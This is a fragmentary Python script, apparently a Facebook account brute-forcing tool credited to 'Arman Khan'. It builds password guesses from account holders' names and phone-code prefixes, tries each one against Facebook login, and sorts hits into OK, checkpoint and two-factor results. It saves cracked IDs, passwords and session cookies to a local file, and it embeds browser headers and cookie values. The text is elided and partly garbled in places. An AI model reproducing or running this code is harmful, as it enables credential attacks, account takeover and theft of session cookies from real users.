...
\t[×] Developed By Arman Khan {EXTRA} (Arman)
{WHITE}[•] AUTHOR       : Arman Khan 
{WHITE}[•] STYLE         : Arman
{WHITE}[•] WhatsApp     :   +93783361438
[•] FaceBook     :   Arman Khan
[•] Version      :   {RED}0.7
{WHITE}[•] Facebook      :   Arman Khan Tech

{WHITE}================================================
   \33[37;41m\t criminal  x Arman  x Khosti \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                clear()
                                print('\033[1;32m EXAMPLE : first last,firtslast,first123,Khan1122,Afghan')
                                linex()
...
def pak():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 0306,0315,0335,0345,9377,9378')
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ARMAN-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        network = random.choice(['Airtel','null','Marshmallow','Telekom China'])
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-ARMAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ARMAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-ARMAN-CP] '+ids+' | '+pas+'\033[1;97m')
...
en-US,en;q=0.9
max-age=0
datr=BpjEZabyetxMWAipkaKrZNzm; sb=BpjEZX_v6HHh6rBCk-E-f9NN; fr=0L5ToQfPpQvWT6ADI..BlxJgG..AAA.0.0.BlxJgG.AWV8FUKtlAw
2.75
Dpr
...
Sec-Ch-Ua-Mobile
"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"
...
Request Headers
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [ARMAN-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
Request Headerser'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-ARMAN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/usmii-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
